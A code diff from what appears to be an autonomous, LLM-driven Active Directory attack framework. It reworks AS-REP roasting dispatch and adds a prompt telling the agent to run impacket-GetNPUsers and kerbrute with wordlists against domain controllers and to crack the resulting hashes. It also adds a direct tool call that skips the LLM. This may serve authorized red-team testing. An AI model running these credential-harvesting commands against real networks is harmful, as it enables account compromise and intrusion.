@@ -80,27 +80,49 @@ pub async fn auto_credential_access(
             break;
         }
 
-        let asrep_work: Vec<(String, String)> = if !dispatcher.is_technique_allowed("asrep_roast") {
-            Vec::new()
-        } else {
-            let state = dispatcher.state.read().await;
-            state
-                .domains
-                .iter()
-                .filter(|d| !state.is_processed(DEDUP_ASREP_DOMAINS, d))
-                .filter_map(|domain| {
-                    // Try DC map first, then fall back to target_ips[0]
-                    let dc_ip = state
-                        .domain_controllers
-                        .get(domain)
-                        .cloned()
-                        .or_else(|| state.target_ips.first().cloned())?;
-                    Some((domain.clone(), dc_ip))
-                })
-                .collect()
-        };
+        // Re-armable dedup. The cold-start AS-REP dispatch fires before
+        // cross-forest LDAP enum has populated `state.users` for foreign
+        // forests — at that point known_users is empty and the dispatch
+        // uses the generic wordlist. Later, after the inter-realm ticket
+        // lands and LDAP-via-ticket enumerates the foreign forest's
+        // accounts in a SID-filtered cross-forest target, we MUST
+        // re-dispatch with known_users populated; otherwise the
+        // discovered usernames never get consumed by AS-REP. Key the
+        // dedup on `domain:has_users` so the "empty" and "non-empty"
+        // states are tracked independently — at most two dispatches per
+        // domain across the operation lifetime.
+        let asrep_work: Vec<(String, String, String)> =
+            if !dispatcher.is_technique_allowed("asrep_roast") {
+                Vec::new()
+            } else {
+                let state = dispatcher.state.read().await;
+                state
+                    .domains
+                    .iter()
+                    .filter_map(|domain| {
+                        let dom_l = domain.to_lowercase();
+                        let has_users = state.users.iter().any(|u| {
+                            u.domain.to_lowercase() == dom_l
+                                && !u.username.is_empty()
+                                && !u.username.ends_with('$')
+                        });
+                        let dedup_key =
+                            format!("{}:{}", dom_l, if has_users { "users" } else { "empty" });
+                        if state.is_processed(DEDUP_ASREP_DOMAINS, &dedup_key) {
+                            return None;
+                        }
+                        // Try DC map first, then fall back to target_ips[0]
+                        let dc_ip = state
+                            .domain_controllers
+                            .get(domain)
+                            .cloned()
+                            .or_else(|| state.target_ips.first().cloned())?;
+                        Some((domain.clone(), dc_ip, dedup_key))
+                    })
+                    .collect()
+            };
 
-        for (domain, dc_ip) in asrep_work {
+        for (domain, dc_ip, dedup_key) in asrep_work {
             let (excluded_users, known_users) = {
                 let state = dispatcher.state.read().await;
                 let excluded = state.quarantined_principals_in_domain(&domain);
@@ -151,7 +173,55 @@ pub async fn auto_credential_access(
                     dc_ip,
                     domain,
                 ));
+            } else {
+                // Cold start: no usernames discovered yet. Without an explicit
+                // userlist the LLM tends to call `kerberos_user_enum_noauth`,
+                // see the default tiny wordlist return no hits on a custom AD,
+                // and abandon the technique. Give it a concrete progressive
+                // enumeration plan so it tries broader wordlists (names.txt,
+                // top-usernames-shortlist.txt) before giving up — these
+                // commonly hit lab-themed accounts on EC2 worker images
+                // where seclists is preinstalled.
+                payload["instructions"] = json!(format!(
+                    "No usernames discovered yet for {dom}. Cold-start AS-REP \
+                     enumeration plan: \
+                     (1) `impacket-GetNPUsers -no-pass -dc-ip {ip} {dom}/ \
+                     -usersfile /usr/share/seclists/Usernames/Names/names.txt \
+                     -format hashcat` (zero-cred; returns $krb5asrep$ for any \
+                     preauth-disabled account). \
+                     (2) If step 1 returns no hashes, also try \
+                     `/usr/share/seclists/Usernames/top-usernames-shortlist.txt` \
+                     and `/usr/share/seclists/Usernames/cirt-default-usernames.txt`. \
+                     (3) For username enumeration via Kerberos error codes \
+                     (KDC_ERR_C_PRINCIPAL_UNKNOWN vs KDC_ERR_PREAUTH_REQUIRED), \
+                     run `kerbrute userenum --dc {ip} -d {dom} \
+                     /usr/share/seclists/Usernames/Names/names.txt` if \
+                     available. \
+                     (4) Hand every $krb5asrep$ hash to the cracker tool \
+                     immediately — even one cracked AS-REP hash unlocks an \
+                     authenticated foothold in {dom}. \
+                     Do NOT fall back to anonymous SAMR if it returns \
+                     ACCESS_DENIED; that path is dead on hardened DCs.",
+                    dom = domain,
+                    ip = dc_ip,
+                ));
             }
+
+            // Mark dedup BEFORE either dispatch fires. The deterministic
+            // path below is fire-and-forget; if we deferred marking until
+            // after a successful LLM submit, a deferred/errored LLM submit
+            // would leave the deterministic spawn unguarded — next 15s tick
+            // would queue another background asrep_roast against the same
+            // userlist. Mark first, dispatch second.
+            dispatcher
+                .state
+                .write()
+                .await
+                .mark_processed(DEDUP_ASREP_DOMAINS, dedup_key.clone());
+            let _ = dispatcher
+                .state
+                .persist_dedup(&dispatcher.queue, DEDUP_ASREP_DOMAINS, &dedup_key)
+                .await;
 
             let priority = dispatcher.effective_priority("asrep_roast");
             match dispatcher
@@ -159,19 +229,80 @@ pub async fn auto_credential_access(
                 .await
             {
                 Ok(Some(task_id)) => {
-                    info!(task_id = %task_id, domain = %domain, "AS-REP roast dispatched");
-                    dispatcher
-                        .state
-                        .write()
-                        .await
-                        .mark_processed(DEDUP_ASREP_DOMAINS, domain.clone());
-                    let _ = dispatcher
-                        .state
-                        .persist_dedup(&dispatcher.queue, DEDUP_ASREP_DOMAINS, &domain)
-                        .await;
+                    info!(
+                        task_id = %task_id,
+                        domain = %domain,
+                        dedup_key = %dedup_key,
+                        known_users = known_users.len(),
+                        "AS-REP roast dispatched"
+                    );
                 }
                 Ok(None) => {}
                 Err(e) => warn!(err = %e, "Failed to dispatch AS-REP roast"),
+            }
+
+            // Deterministic AS-REP roast: when we already have a userlist,
+            // skip the LLM and call the tool directly. The LLM agent loop
+            // in the credential_access role consistently picks
+            // `password_spray` and `username_as_password` over
+            // `asrep_roast` despite the techniques ordering and explicit
+            // instructions — this leaves the most reliable foothold path
+            // for SID-filtered foreign forests (AS-REP roast of a preauth-
+            // disabled account from the discovered userlist) unexercised.
+            // dispatch_tool routes through the worker tool_exec subject and
+            // its discoveries flow into state via push_realtime_discoveries.
+            // Guarded by the dedup mark above — at most one deterministic
+            // dispatch per (domain, has-users) transition.
+            if !known_users.is_empty() {
+                let det_args = json!({
+                    "domain": domain,
+                    "dc_ip": dc_ip,
+                    "known_users": known_users,
+                });
+                let det_call = ares_llm::ToolCall {
+                    id: format!("asrep_det_{}", uuid::Uuid::new_v4().simple()),
+                    name: "asrep_roast".to_string(),
+                    arguments: det_args,
+                };
+                let det_task_id = format!(
+                    "asrep_det_{}",
+                    &uuid::Uuid::new_v4().simple().to_string()[..12]
+                );
+                info!(
+                    task_id = %det_task_id,
+                    domain = %domain,
+                    known_users = known_users.len(),
+                    "AS-REP roast dispatched (direct tool, no LLM)"
+                );
+                let dispatcher_bg = dispatcher.clone();
+                let domain_bg = domain.clone();
+                tokio::spawn(async move {
+                    match dispatcher_bg
+                        .llm_runner
+                        .tool_dispatcher()
+                        .dispatch_tool("credential_access", &det_task_id, &det_call)
+                        .await
+                    {
+                        Ok(result) => {
+                            let hash_count = result
+                                .discoveries
+                                .as_ref()
+                                .and_then(|d| d.get("hashes"))
+                                .and_then(|h| h.as_array())
+                                .map(|a| a.len())
+                                .unwrap_or(0);
+                            info!(
+                                task_id = %det_task_id,
+                                domain = %domain_bg,
+                                hash_count,
+                                "Deterministic AS-REP roast completed"
+                            );
+                        }
+                        Err(e) => {
+                            warn!(err = %e, domain = %domain_bg, "Deterministic AS-REP roast failed");
+                        }
+                    }
+                });
             }
         }
 
@@ -534,10 +665,15 @@ pub async fn auto_credential_access(
                         })
                         // Only spray after initial recon (AS-REP) has completed.
                         // This prevents spraying in the first cycle when Kerberoast
-                        // hasn't had time to collect hashes yet.
+                        // hasn't had time to collect hashes yet. AS-REP dedup is
+                        // keyed `domain:empty` or `domain:users` (re-armable on
+                        // user-list transitions); either form satisfies the gate.
                         .filter(|(domain, _)| {
-                            state.is_processed(DEDUP_ASREP_DOMAINS, domain)
-                                || state.is_processed(DEDUP_ASREP_DOMAINS, &domain.to_lowercase())
+                            let d = domain.to_lowercase();
+                            let empty_key = format!("{d}:empty");
+                            let users_key = format!("{d}:users");
+                            state.is_processed(DEDUP_ASREP_DOMAINS, &empty_key)
+                                || state.is_processed(DEDUP_ASREP_DOMAINS, &users_key)
                         })
                         // Only spray after delegation enumeration has dispatched for
                         // at least one credential in this domain. Spraying before
